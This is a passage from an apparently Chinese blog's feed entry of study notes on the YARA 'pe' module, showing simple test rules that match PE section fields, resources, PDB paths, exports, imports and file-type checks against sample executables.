class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">import <span class="hljs-string">&quot;pe&quot;</span><br><br>rule test<br>&#123;<br>condition:<br>pe<span class="hljs-selector-class">.sections</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.name</span> == <span class="hljs-string">&quot;.text&quot;</span> and<br>pe<span class="hljs-selector-class">.sections</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.virtual_address</span> == <span class="hljs-number">0</span>x1000 and<br>pe<span class="hljs-selector-class">.sections</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.virtual_size</span> == <span class="hljs-number">0</span>xca1 and<br>pe<span class="hljs-selector-class">.sections</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.raw_data_offset</span> == <span class="hljs-number">0</span>x400 and<br>pe<span class="hljs-selector-class">.sections</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.raw_data_size</span> == <span class="hljs-number">0</span>xe00<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="resources"><a href="#resources" class="headerlink" title="resources"></a>resources</h3><p>一个从0开始的资源对象数组，PE拥有的每个资源对应一个。可以使用[]访问单个资源。每个资源对象具有以下属性：</p><p><code>rva</code> 资源数据的RVA</p><p><code>offset</code> 资源数据偏移量</p><p><code>length</code> 资源数据的长度</p><p><code>type</code> 资源类型（整数）</p><p><code>id</code> 资源的ID（整数）</p><p><code>language</code> 资源的语言（整数）</p><p><code>type_string</code> 资源类型为字符串</p><p><code>name_string</code> 字符串的资源名称</p><p><code>language_string</code> 字符串的资源语言</p><p>根据PE结构的资源部分可以知道，资源节是树状的结构，一层一层，而第一层就是资源类型，第二层是资源ID，第三层是资源语言，然后之后是具体的数据，具体这部分可以去学习一下PE结构。</p><p>看下示例文件的资源结构，如图可以看到这三项分别是24、1、1033。</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/10.png"></p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">import <span class="hljs-string">&quot;pe&quot;</span><br>rule test<br>&#123;<br>condition:<br>pe<span class="hljs-selector-class">.resources</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.type</span> == <span class="hljs-number">24</span> and<br>pe<span class="hljs-selector-class">.resources</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.id</span> == <span class="hljs-number">1</span> and<br>pe<span class="hljs-selector-class">.resources</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.language</span> == <span class="hljs-number">1033</span> and<br>pe<span class="hljs-selector-class">.resources</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.length</span> == <span class="hljs-number">0</span>x17D<br>&#125;<br></code></pre></div></td></tr></table></figure><p>再拿一个别的文件来进行测试，可以看到其资源类型是字符串类型“MYRES”</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/11.png"></p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">import <span class="hljs-string">&quot;pe&quot;</span><br>rule test<br>&#123;<br>condition:<br>pe<span class="hljs-selector-class">.resources</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.type_string</span> == <span class="hljs-string">&quot;M\x00Y\x00R\x00E\x00S\x00&quot;</span> and<br>pe<span class="hljs-selector-class">.resources</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.id</span> == <span class="hljs-number">102</span> and<br>pe<span class="hljs-selector-class">.resources</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.language</span> == <span class="hljs-number">2052</span><br>&#125;<br><br><br></code></pre></div></td></tr></table></figure><p>再测试一个文件，看到资源类型和资源ID都是字符串。</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/12.png"></p><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">import &quot;pe&quot;<br>rule test<br>&#123;<br>condition:<br>pe.resources[0].type_string == &quot;U<span class="hljs-symbol">\x</span>00N<span class="hljs-symbol">\x</span>00I<span class="hljs-symbol">\x</span>00C<span class="hljs-symbol">\x</span>00O<span class="hljs-symbol">\x</span>00D<span class="hljs-symbol">\x</span>00E<span class="hljs-symbol">\x</span>00&quot; and<br>pe.resources[0].name_string == &quot;L<span class="hljs-symbol">\x</span>00O<span class="hljs-symbol">\x</span>00C<span class="hljs-symbol">\x</span>00A<span class="hljs-symbol">\x</span>00L<span class="hljs-symbol">\x</span>00I<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\x</span>00A<span class="hljs-symbol">\x</span>00T<span class="hljs-symbol">\x</span>00I<span class="hljs-symbol">\x</span>00O<span class="hljs-symbol">\x</span>00N<span class="hljs-symbol">\x</span>00&quot; and<br>pe.resources[0].language == 0<br>&#125;<br><br><br></code></pre></div></td></tr></table></figure><h3 id="pdb-path"><a href="#pdb-path" class="headerlink" title="pdb_path"></a>pdb_path</h3><p>pdb文件的路径</p><p>查看示例程序的PDB路径</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/13.png"></p><figure class="highlight swift"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs swift"><span class="hljs-keyword">import</span> &quot;pe&quot;<br>rule test<br>&#123;<br>condition:<br>pe.pdb_path <span class="hljs-operator">==</span> <span class="hljs-string">&quot;D:<span class="hljs-subst">\\</span>programing<span class="hljs-subst">\\</span>something<span class="hljs-subst">\\</span>YaraRule_Test<span class="hljs-subst">\\</span>Release<span class="hljs-subst">\\</span>YaraRule_Test.pdb&quot;</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="exports"><a href="#exports" class="headerlink" title="exports"></a>exports</h3><p>PE文件导出的函数名，可以使用函数名也可以使用序号。</p><p>测试一下user32.dll，我们知道这个DLL会导出函数<code>MessageBoxA</code></p><figure class="highlight coffeescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs coffeescript"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;pe&quot;</span><br>rule test<br>&#123;<br>condition:<br>pe.<span class="hljs-built_in">exports</span>(<span class="hljs-string">&quot;MessageBoxA&quot;</span>)<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/14.png"></p><h3 id="imports"><a href="#imports" class="headerlink" title="imports"></a>imports</h3><p>如果一个PE文件从某DLL中导入了某个函数，则函数会返回TRUE，否则返回FALSE。我们的测试程序调用了MessageBoxA，这个函数是从user32.dll中导入的。也可以使用序号，也可以只是dll名称，具体用法还有很多，请查看官方文档。</p><p><img src="/2021/09/22/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89/15.png"></p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">import <span class="hljs-string">&quot;pe&quot;</span><br>rule <span class="hljs-class">test</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.imports(<span class="hljs-string">&quot;user32.dll&quot;</span>,<span class="hljs-string">&quot;MessageBoxA&quot;</span>) <br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="is-pe"><a href="#is-pe" class="headerlink" title="is_pe"></a>is_pe</h3><p>如果文件是PE文件，返回true</p><h3 id="is-dll"><a href="#is-dll" class="headerlink" title="is_dll()"></a>is_dll()</h3><p>如果是DLL文件，返回true</p><h3 id="is-32bit"><a href="#is-32bit" class="headerlink" title="is_32bit()"></a>is_32bit()</h3><p>如果PE文件是32位的，返回true</p><h3 id="is-64bit"><a href="#is-64bit" class="headerlink" title="is_64bit()"></a>is_64bit()</h3><p>如果PE文件是64位，返回true</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">import <span class="hljs-string">&quot;pe&quot;</span><br>rule <span class="hljs-class">ispe</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.is_pe<br>&#125;<br>rule <span class="hljs-class">isdll</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.is_dll()<br>&#125;<br>rule <span class="hljs-class">is32</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.is_32bit()<br>&#125;<br>rule <span class="hljs-class">is64</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>pe.is_64bit()<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;基本的一些语法，规则的应用基本已经学习完了，现在来练习一下模块的用法，主要先是PE这个模块，具体的每一个值的用法在官方文档中已经描述的非常详</summary>
      
    
    
    
    <category term="YARA" scheme="https://b1ackie.cn/categories/YARA/"/>
    
    
    <category term="YARA" scheme="https://b1ackie.cn/tags/YARA/"/>
    
    <category term="恶意代码检测" scheme="https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B/"/>
    
  </entry>
  
</feed>
